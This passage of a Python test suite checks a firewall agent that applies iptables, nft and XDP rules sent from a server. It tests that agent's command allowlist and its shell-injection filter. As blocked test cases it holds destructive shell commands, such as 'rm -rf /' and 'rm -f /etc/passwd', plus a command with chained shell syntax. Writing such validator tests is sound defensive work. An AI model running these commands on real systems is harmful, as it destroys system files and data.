            })
        ack_path = agent.api._post.call_args[0][0]
        assert ack_path == "/agent/commands/ack"

    def test_for_cc_prefix_allowed(self, agent):
        """The 'for cc in ' prefix should be allowed (used for country-code blocking loops)."""
        # Note: this command contains shell chars which would normally be blocked.
        # But if the prefix is 'for cc in', the shell injection check still applies.
        # In practice, the allowed prefix 'for cc in ' is blocked by the metachar
        # check because it uses ';'. Let's verify the prefix at least matches.
        # The actual production usage likely sends these via a different path.
        cmd = "for cc in CN RU; do iptables -A INPUT -m geoip --src-cc $cc -j DROP; done"
        with patch("subprocess.run") as mock_run:
            agent._execute_command({
                "id": 66,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "for cc in test",
            })
        # This WILL be blocked by the shell injection filter (contains ; and $)
        # despite matching the 'for cc in ' prefix. This is correct -- the injection
        # filter is a safety net that overrides prefix matching.
        mock_run.assert_not_called()

    def test_xdp_rate_limit_mode(self, agent):
        """XDP filter with rate_pps should generate a rate-limit nft rule."""
        spec = json.dumps({
            "type": "xdp_filter",
            "target": "192.0.2.1",
            "proto": "udp",
            "dport": 53,
            "action": "drop",
            "rate_pps": 10000,
        })
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_xdp_command(204, spec, "rate limit")

        # Find the nft add rule command (the last shell=True call after dedup)
        shell_calls = [c for c in mock_run.call_args_list if c.kwargs.get("shell", False)]
        rule_calls = [c for c in shell_calls if "nft add rule" in c[0][0]]
        assert len(rule_calls) >= 1
        rule_cmd = rule_calls[0][0][0]
        assert "limit rate over 10000/second" in rule_cmd
        assert "drop" in rule_cmd
        assert "ip saddr 192.0.2.1" in rule_cmd
        assert "th dport 53" in rule_cmd

    def test_xdp_full_drop_mode(self, agent):
        """XDP filter without rate_pps should generate a full drop rule."""
        spec = json.dumps({
            "type": "xdp_filter",
            "target": "192.0.2.1",
            "proto": "tcp",
            "action": "drop",
        })
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_xdp_command(205, spec, "full drop")

        shell_calls = [c for c in mock_run.call_args_list if c.kwargs.get("shell", False)]
        rule_calls = [c for c in shell_calls if "nft add rule" in c[0][0]]
        assert len(rule_calls) >= 1
        rule_cmd = rule_calls[0][0][0]
        assert "drop" in rule_cmd
        assert "limit rate" not in rule_cmd

    def test_xdp_pass_action(self, agent):
        """XDP filter with action='pass' should generate an accept rule."""
        spec = json.dumps({
            "type": "xdp_filter",
            "target": "192.0.2.1",
            "proto": "any",
            "action": "pass",
        })
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_xdp_command(206, spec, "pass action")

        shell_calls = [c for c in mock_run.call_args_list if c.kwargs.get("shell", False)]
        rule_calls = [c for c in shell_calls if "nft add rule" in c[0][0]]
        assert len(rule_calls) >= 1
        rule_cmd = rule_calls[0][0][0]
        assert "accept" in rule_cmd

    def test_partial_success_mixed_commands(self, agent):
        """If some commands succeed and some fail, status should be 'applied' not 'failed'."""
        cmd_text = "\n".join([
            "iptables -A INPUT -s 192.0.2.1 -j DROP",
            "iptables -A INPUT -s 192.0.2.2 -j DROP",
        ])
        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = [
                MagicMock(returncode=0, stderr="", stdout=""),   # first succeeds
                MagicMock(returncode=1, stderr="error", stdout=""),  # second fails
            ]
            agent._execute_command({
                "id": 67,
                "command_type": "iptables",
                "command_text": cmd_text,
                "title": "partial",
            })
        ack = agent.api._post.call_args[0][1]
        # At least one applied, so status is "applied" even though there are errors
        assert ack["status"] == "applied"
        assert ack["error"] is not None

    def test_nft_auto_create_table_and_chain(self, agent):
        """nft add rule should auto-create the table and chain before adding the rule."""
        cmd = "nft add rule inet mytable mychain ip saddr 192.0.2.1 drop"
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
            agent._execute_command({
                "id": 68,
                "command_type": "iptables",
                "command_text": cmd,
                "title": "nft auto-create",
            })

        calls = mock_run.call_args_list
        # First call should be nft add table
        table_call = calls[0]
        assert table_call[0][0] == ["nft", "add", "table", "inet", "mytable"]
        # Second call should be nft add chain
        chain_call = calls[1]
        assert chain_call[0][0][0:5] == ["nft", "add", "chain", "inet", "mytable"]
        assert "mychain" in chain_call[0][0][5]

    def test_rm_only_allowed_for_ft_prefixed_paths(self, agent):
        """rm -f is only allowed for /etc/nginx/conf.d/ft_* and /etc/apache2/conf-enabled/ft_*."""
        allowed = [
            "rm -f /etc/nginx/conf.d/ft_block_rule.conf",
            "rm -f /etc/apache2/conf-enabled/ft_ddos_protect.conf",
        ]
        blocked = [
            "rm -f /etc/nginx/conf.d/other.conf",
            "rm -f /etc/passwd",
            "rm -rf /",
            "rm -f /etc/apache2/conf-enabled/other.conf",
        ]
        for cmd in allowed:
            agent.api._post.reset_mock()
            with patch("subprocess.run") as mock_run:
                mock_run.return_value = MagicMock(returncode=0, stderr="", stdout="")
                agent._execute_command({
                    "id": 70,
                    "command_type": "iptables",
                    "command_text": cmd,
                    "title": "rm allowed",
                })
            assert mock_run.called, f"Should be allowed: {cmd}"

        for cmd in blocked:
            agent.api._post.reset_mock()
            with patch("subprocess.run") as mock_run:
                agent._execute_command({
                    "id": 71,
                    "command_type": "iptables",
                    "command_text": cmd,
                    "title": "rm blocked",
                })
            mock_run.assert_not_called(), f"Should be blocked: {cmd}"
